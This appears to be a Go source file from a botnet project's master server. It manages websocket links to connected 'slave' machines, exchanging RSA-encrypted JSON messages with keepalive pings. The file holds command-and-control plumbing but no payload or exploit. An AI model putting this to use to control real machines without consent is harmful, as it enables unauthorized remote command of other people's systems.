package master

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/gorilla/websocket"

	uuid "github.com/satori/go.uuid"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 512                 // Maximum message size allowed from peer
)

// SlaveCtrl holds the information the master needs from a connected slave
type SlaveCtrl struct {
	id          string
	slavePubKey *rsa.PublicKey
	WSConn      *websocket.Conn
	MsgChan     chan *Msg
	Master      *Master
}

// NewSlaveCtrl is the constructor for a slave controller abstraction
func NewSlaveCtrl(m *Master, slavePubKey string, conn *websocket.Conn) (*SlaveCtrl, error) {
	pubKey, err := encryption.DecodePubKeyPEM([]byte(slavePubKey))
	if err != nil {
		return nil, fmt.Errorf("could not decode pub key: %s", err)
	}
	return &SlaveCtrl{
		id:          uuid.NewV4().String(),
		slavePubKey: pubKey,
		WSConn:      conn,
		MsgChan:     make(chan *Msg),
		Master:      m,
	}, nil
}

func (s *SlaveCtrl) reader() {
	s.WSConn.SetReadLimit(maxMessageSize)
	s.WSConn.SetReadDeadline(time.Now().Add(pongWait))
	s.WSConn.SetPongHandler(func(string) error { s.WSConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		msgType, encryptedMessage, err := s.WSConn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}

		// discard all non binary messages
		if msgType != 2 {
			continue
		}

		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.Master.masterPrivKey)
		if err != nil {
			log.Printf("could not decrypt message from slave %s: %s", s.id, err)
			continue
		}
		var msg Msg
		if err = json.Unmarshal(jsonMsg, &msg); err != nil {
			log.Printf("could not unmarshal message from slave %s: %s", s.id, err)
			continue
		}
		s.Master.receiveMsgChan <- &msg
	}
}

func (s *SlaveCtrl) writer() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		s.WSConn.Close()
	}()
	for {
		select {
		case message, ok := <-s.MsgChan:
			s.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				s.WSConn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			w, err := s.WSConn.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			msgBytes, err := json.Marshal(message)
			if err != nil {
				return
			}
			encryptedMsg, err := encryption.EncryptMessage(msgBytes, s.slavePubKey)
			if err != nil {
				return
			}
			w.Write(encryptedMsg)
			if err := w.Close(); err != nil {
				return
			}
		case <-ticker.C:
			s.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := s.WSConn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
